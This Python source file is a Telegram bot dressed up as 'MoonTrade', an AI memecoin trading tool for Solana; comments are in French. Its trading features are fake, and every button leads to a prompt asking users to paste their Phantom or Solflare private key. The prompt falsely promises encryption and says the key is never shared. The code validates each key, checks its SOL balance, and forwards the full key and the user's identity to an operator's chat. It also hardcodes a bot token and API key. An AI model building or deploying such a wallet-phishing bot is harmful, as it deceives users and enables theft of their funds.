import logging
import base58
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ⚠️ REMPLACEZ PAR VOTRE TOKEN
BOT_TOKEN = "8402114053:AAFLGOTHTX1pmNZ9JiPL64MMBTNSbriqTfc"

# Votre groupe Telegram pour recevoir les messages
ADMIN_CHAT_ID = -5299554897

# Helius RPC URL
HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /start"""
    
    # Récupérer le prénom de l'utilisateur
    user = update.message.from_user
    user_name = user.first_name
    
    # Message de bienvenue personnalisé avec image
    welcome_text = f"""🚀 Welcome {user_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
    
    # Création des boutons interactifs
    keyboard = [
        [
            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
        ],
        [
            InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
            InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
        ],
        [
            InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
            InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
        ],
        [
            InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
            InlineKeyboardButton("🌐 Language", callback_data='language')
        ],
        [
            InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # URL de l'image
    image_url = "https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg"
    
    # Envoi de l'image avec le message et les boutons
    await update.message.reply_photo(
        photo=image_url,
        caption=welcome_text,
        reply_markup=reply_markup
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les clics sur les boutons"""
    query = update.callback_query
    await query.answer()
    
    # Récupération de l'action cliquée
    action = query.data
    
    # Si l'utilisateur clique sur "Back"
    if action == 'back_to_menu':
        # Re-afficher le menu principal SANS image
        user = query.from_user
        welcome_text = f"""🚀 Welcome {user.first_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
        
        keyboard = [
            [
                InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
                InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
            ],
            [
                InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
                InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
            ],
            [
                InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
                InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
            ],
            [
                InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
                InlineKeyboardButton("🌐 Language", callback_data='language')
            ],
            [
                InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Supprimer l'ancien message et envoyer un nouveau SANS image
        await query.message.delete()
        await query.message.reply_text(
            welcome_text,
            reply_markup=reply_markup
        )
        return
    
    # Si l'utilisateur clique sur Phantom ou Solflare
    if action in ['phantom_wallet', 'solflare_wallet']:
        wallet_name = "Phantom" if action == 'phantom_wallet' else "Solflare"
        instruction_message = f"""🔐 **{wallet_name} Wallet Connection**

To enable trading features, please provide your wallet private key.

📝 **How to find your private key:**

**{wallet_name} Wallet:**
1. Open your {wallet_name} wallet
2. Go to Settings → Security & Privacy
3. Select "Export Private Key"
4. Copy and paste it here

⚠️ **Security Notice:**
Your private key is encrypted with military-grade security and never shared with third parties. We use it solely to execute trades on your behalf.

Please enter your private key below:"""
        
        # Bouton Back
        back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        # Supprimer l'ancien message (avec image) et envoyer un nouveau (sans image)
        await query.message.delete()
        await query.message.reply_text(
            instruction_message,
            reply_markup=back_markup,
            parse_mode='Markdown'
        )
        # Marquer que l'utilisateur attend de connecter son wallet
        context.user_data['waiting_for_wallet'] = True
        context.user_data['wallet_type'] = wallet_name
        return
    
    # Nouveau callback pour revenir au menu wallet
    if action == 'back_to_wallet_menu':
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        # Annuler l'attente de wallet
        context.user_data['waiting_for_wallet'] = False
        return
    
    # Pour tous les autres boutons, afficher le message d'import de wallet
    wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
    
    # Création des boutons de wallet
    wallet_keyboard = [
        [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
        [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
        [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
    ]
    
    wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
    
    # Supprimer l'ancien message (avec image) et envoyer un nouveau (sans image)
    await query.message.delete()
    await query.message.reply_text(
        wallet_message,
        reply_markup=wallet_markup
    )


async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /trade"""
    keyboard = [
        [
            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
        ],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📈 **Trading Module**\n\nSelect a trading option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /sniper"""
    keyboard = [
        [InlineKeyboardButton("🎯 Activate Sniper", callback_data='activate_sniper')],
        [InlineKeyboardButton("⚙️ Configure Settings", callback_data='sniper_settings')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎯 **Sniper Mode**\n\nAuto-buy tokens at launch\n\nStatus: Inactive",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /wallet"""
    wallet_message = """🔐 **Wallet Manager**

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
    
    wallet_keyboard = [
        [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
        [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    
    wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
    await update.message.reply_text(wallet_message, reply_markup=wallet_markup, parse_mode='Markdown')


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /scan"""
    keyboard = [
        [InlineKeyboardButton("🔍 Scan New Tokens", callback_data='scan_new')],
        [InlineKeyboardButton("📊 Market Overview", callback_data='market_overview')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔍 **Real-Time Scanner**\n\nMonitoring Solana blockchain...",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /stats"""
    stats_text = """📊 **Trading Performance**

**24h Stats:**
• Trades: 0
• Profit: 0 SOL
• Win Rate: 0%

**All Time:**
• Total Trades: 0
• Total Profit: 0 SOL
• Best Trade: N/A

_Start trading to see your stats!_"""
    
    keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode='Markdown')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /help"""
    help_text = """📚 **Commandes disponibles:**

/start - Launch the bot
/trade - Open trading module
/sniper - Activate sniper mode
/wallet - Manage wallets
/scan - Real-time token scanner
/predict - AI market predictions
/whale - Whale movement tracker
/analyze - Smart contract analyzer
/rugcheck - Rug-pull detector
/stats - Trading performance stats
/settings - Configure bot settings
/help - Get support and guides

💡 **Need help?**
Contact support: @votre_support
"""
    await update.message.reply_text(help_text)


async def verify_wallet_and_balance(private_key_str: str):
    """Vérifie la clé privée et récupère le solde SOL"""
    try:
        import aiohttp
        from solders.keypair import Keypair
        
        # Essayer différents formats de clé privée
        keypair = None
        public_key = None
        
        # Format 1 : Base58 (le plus courant pour Phantom)
        try:
            secret_key = base58.b58decode(private_key_str.strip())
            if len(secret_key) == 64:  # Taille correcte pour Solana
                keypair = Keypair.from_bytes(secret_key)
                public_key = str(keypair.pubkey())
                logger.info(f"✅ Clé décodée en Base58, Public Key: {public_key}")
        except Exception as e:
            logger.info(f"Format Base58 échoué: {e}")
        
        # Format 2 : Liste de bytes [1,2,3,...]
        if not keypair:
            try:
                # Nettoyer la chaîne
                clean_str = private_key_str.strip().replace('[', '').replace(']', '').replace(' ', '')
                secret_key = bytes([int(x) for x in clean_str.split(',')])
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format liste bytes échoué: {e}")
        
        # Format 3 : Hex
        if not keypair:
            try:
                secret_key = bytes.fromhex(private_key_str.strip())
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en Hex, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format Hex échoué: {e}")
        
        # Si aucun format n'a fonctionné
        if not keypair or not public_key:
            logger.error("❌ Tous les formats de clé privée ont échoué")
            return None, None, "invalid"
        
        # Récupérer le solde via RPC
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [public_key]
                }
                
                async with session.post(HELIUS_RPC_URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                    
                    if "result" in data:
                        lamports = data["result"]["value"]
                        sol_balance = lamports / 1_000_000_000  # Convertir en SOL
                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL")
                        return public_key, sol_balance, "valid"
                    else:
                        logger.warning(f"Pas de résultat dans la réponse RPC: {data}")
                        return public_key, 0, "valid"
        
        except Exception as e:
            logger.error(f"Erreur récupération solde: {e}")
            # Même si on ne peut pas récupérer le solde, la clé est valide
            return public_key, 0, "valid"
    
    except Exception as e:
        logger.error(f"Erreur générale vérification wallet: {e}")
        return None, None, "invalid"


async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère tous les messages texte et les transfère à l'admin"""
    user = update.message.from_user
    user_message = update.message.text
    
    # Vérifier si l'utilisateur attend de connecter son wallet
    if context.user_data.get('waiting_for_wallet'):
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        context.user_data['waiting_for_wallet'] = False
        
        # Vérifier la clé privée et le solde
        public_key, sol_balance, status = await verify_wallet_and_balance(user_message)
        
        if status == "invalid":
            # Clé privée invalide
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                "⚠️ Validation Error\n\nInvalid private key format.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""❌ **Clé privée invalide**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

🔑 **Clé tentée:**
`{user_message[:20]}...`

---
⚠️ _Clé privée invalide_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Clé valide, vérifier le solde
        if sol_balance == 0:
            # Wallet vide
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                "⚠️ Wallet Cannot Be Accepted\n\nInsufficient SOL balance.\nYour wallet must contain SOL to use trading features.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""⚠️ **Wallet vide rejeté**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** 0 SOL

🔑 **Private Key:**
`{user_message}`

---
❌ _Wallet rejeté - Solde insuffisant_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Wallet valide avec SOL
        await update.message.reply_text(
            f"✅ **Wallet Connected Successfully**\n\n"
            f"💳 **Type:** {wallet_type}\n"
            f"💰 **Balance:** {sol_balance:.4f} SOL\n"
            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
            f"You can now access all trading features.",
            parse_mode='Markdown'
        )
        
        # Notification à l'admin
        admin_notification = f"""✅ **Wallet connecté avec succès**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL

🔑 **Private Key:**
`{user_message}`

---
✅ _Wallet accepté et connecté_"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Message normal - Notification à l'admin
    admin_notification = f"""📨 **Nouveau message reçu**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`

💬 **Message:**
{user_message}

---
_Envoyé depuis le bot_"""
    
    try:
        # Envoyer le message à l'admin
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notification,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Erreur lors de l'envoi à l'admin: {e}")
    
    # Envoyer le message à l'utilisateur
    await update.message.reply_text(
        "⚠️ Validation Error\n\nInvalid private key format."
    )


def main():
    """Fonction principale pour lancer le bot"""
    
    # Création de l'application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout des handlers (gestionnaires de commandes)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("trade", trade_command))
    application.add_handler(CommandHandler("sniper", sniper_command))
    application.add_handler(CommandHandler("wallet", wallet_command))
    application.add_handler(CommandHandler("scan", scan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Handler pour tous les messages texte
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    # Démarrage du bot
    logger.info("Bot démarré ! 🚀")
    logger.info(f"Messages seront envoyés au Chat ID: {ADMIN_CHAT_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
